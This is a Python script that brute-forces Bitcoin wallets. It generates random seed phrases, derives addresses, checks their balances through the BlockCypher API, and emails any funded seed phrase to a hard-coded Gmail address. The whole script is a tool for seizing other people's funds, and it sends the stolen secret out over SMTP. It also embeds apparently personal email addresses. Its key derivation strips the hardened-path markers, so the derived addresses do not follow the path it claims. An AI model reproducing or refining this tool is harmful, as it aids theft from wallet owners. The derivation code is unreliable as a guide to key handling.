import requests
import time
import random
from mnemonic import Mnemonic
import bip32utils
from tenacity import retry, wait_exponential, stop_after_attempt, retry_if_exception_type
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Set to store checked addresses to avoid duplicate checks
checked_addresses = set()

# Function to generate Bitcoin address from a seed phrase
def generate_btc_address(seed_phrase, path="m/44'/0'/0'/0/0"):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(seed_phrase)
    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    path = path.split('/')[1:]
    for index in path:
        index = int(index.replace("'", ""))
        bip32_root_key_obj = bip32_root_key_obj.ChildKey(index)
    return bip32_root_key_obj.Address()

# Function to check balance of a Bitcoin address with retries and exponential backoff
@retry(wait=wait_exponential(min=1, max=10), stop=stop_after_attempt(5), 
       retry=retry_if_exception_type(requests.exceptions.ConnectTimeout))
def check_balance(address, timeout=30):
    url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
    try:
        response = requests.get(url, timeout=timeout)
        if response.status_code == 200:
            data = response.json()
            return data['final_balance']  # Balance is in satoshis
        elif response.status_code == 429:
            return None
        else:
            return None
    except requests.exceptions.RequestException:
        return None

# Function to find wallets with funds
def find_wallet_with_funds():
    try:
        random_seed_phrase = Mnemonic("english").generate(strength=128)
        address = generate_btc_address(random_seed_phrase)

        if address in checked_addresses:
            return None

        checked_addresses.add(address)

        balance = check_balance(address)  # Check balance of the generated address
        if balance and balance > 0:
            return random_seed_phrase, balance
    except Exception as e:
        return None

    time.sleep(random.uniform(1, 3))
    return None

# Function to send email notification
def send_email_notification(seed_phrase, balance):
    sender_email = "nerdgod21@gmail.com"  # Your email
    receiver_email = "dylieberman@gmail.com"  # Receiver email (can be your own)
    password = ""  # Your email password or app password

    # Create the email content
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Wallet with Funds Found!"
    body = f"Seed Phrase: {seed_phrase}\nBalance: {balance} satoshis"
    msg.attach(MIMEText(body, 'plain'))

    try:
        # Set up the server using Gmail SMTP
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Main function to execute the search until a wallet with funds is found
def search_for_wallet_with_funds():
    wallet_count = 0
    while True:
        result = find_wallet_with_funds()

        wallet_count += 1
        if wallet_count % 50 == 0:
            print(f"Checked {wallet_count} wallets...")

        if result:
            seed_phrase, balance = result
            print(f"Found wallet with funds!\nSeed Phrase: {seed_phrase}\nBalance: {balance} satoshis")
            send_email_notification(seed_phrase, balance)  # Send an email notification
            break

        time.sleep(random.uniform(1, 3))

# Run the search once and stop when a wallet with funds is found
search_for_wallet_with_funds()
